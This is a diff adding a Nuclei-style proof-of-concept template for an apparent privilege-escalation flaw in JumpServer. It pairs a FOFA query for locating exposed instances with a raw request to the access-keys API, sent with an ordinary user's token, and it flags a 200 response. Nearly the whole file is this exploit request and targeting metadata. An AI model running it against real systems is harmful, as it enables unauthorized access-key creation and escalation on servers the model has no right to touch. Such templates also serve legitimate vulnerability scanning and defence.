@@ -1,0 +1,21 @@
+id: poc-wghd4t2gehryo1a4
+info:
+  name: JumpServer Access Key 存在越权泄露漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wghd4t2gehryo1a4'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wghd4t2gehryo1a4
+    fofa: title="jumpserver"
+http:
+- raw:
+  - 'GET /api/v1/authentication/access-keys/?action=create&_rel=not HTTP/1.1
+
+    Authorization: Bearer <普通用户自己的token>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
